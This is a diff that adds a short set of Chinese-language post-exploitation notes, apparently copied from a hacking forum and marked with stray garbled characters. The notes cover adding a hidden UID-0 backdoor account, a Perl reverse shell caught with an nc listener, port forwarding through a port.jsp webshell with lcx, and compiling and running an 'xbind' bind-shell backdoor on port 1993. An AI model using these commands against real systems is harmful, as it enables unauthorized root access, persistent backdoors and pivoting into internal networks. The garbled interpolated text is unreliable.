@@ -1,0 +1,25 @@
+useradd -o -u 0 nothack 
+passwd 用户名(提示输入密码)
+
+bc.pl  反弹shell
+
+nc本地监听   nc -vv -l -p 2020
+
+perl bc.pl IP地址 端口(2020)
+
+js端口转发
+
+外网使用lcx -listen 51 4000 监听。
+
+访问port.jsp?localIP=127.0.0.1&localPort=3390&remoteIP=192.168.7.88&remotePort=51 即可
+
+
+Linxu后门
+
+使用方法啰嗦一下; [7 }0 o2 {+ I' u8 E5 k/ `
+1.先编译一下文件- b! i4 E) O6 }) C' k- [: N3 [! B
+gcc -o xbind xbind.c
+8 K7 I. s' F; c1 C9 y0 L  x90 Security Team2.运行后门并开1993端口
+! u, }  w' Z! O - 专注信息安全./xbind 1993
+6 t) x2 k1 t9 u; @3.在本机NC连接5 a1 a5 G6 M3 r& B
+nc -vv [SERVER IP] 1993 
